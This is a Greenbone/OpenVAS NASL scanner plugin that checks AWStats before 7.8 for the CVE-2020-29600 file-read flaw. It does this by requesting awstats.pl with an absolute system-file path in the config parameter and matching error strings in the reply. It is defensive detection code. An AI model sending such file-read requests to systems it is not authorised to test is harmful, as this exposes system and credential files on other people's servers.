CPE = "cpe:/a:awstats:awstats";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.145066" );
	script_version( "2021-08-16T09:00:57+0000" );
	script_tag( name: "last_modification", value: "2021-08-16 09:00:57 +0000 (Mon, 16 Aug 2021)" );
	script_tag( name: "creation_date", value: "2020-12-18 03:00:17 +0000 (Fri, 18 Dec 2020)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2021-03-04 20:52:00 +0000 (Thu, 04 Mar 2021)" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_cve_id( "CVE-2020-29600" );
	script_name( "AWStats < 7.8 File Read Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2020 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "awstats_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "awstats/installed" );
	script_tag( name: "summary", value: "AWStats is prone to a file read vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "In AWStats cgi-bin/awstats.pl?config= accepts an absolute pathname, even
  though it was intended to only read a file in the /etc/awstats/awstats.conf format. NOTE: this issue exists
  because of an incomplete fix for CVE-2017-1000501." );
	script_tag( name: "affected", value: "AWStats 7.7 and prior." );
	script_tag( name: "solution", value: "Update to Version 7.8 or later." );
	script_xref( name: "URL", value: "https://github.com/eldy/awstats/issues/90" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/awstats.pl?config=/" + file;
	if(http_vuln_check( port: port, url: url, pattern: "/" + file, check_header: TRUE, extra_check: make_list( "Warning: Syntax error line",
		 "file, web server or permissions) may be wrong." ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

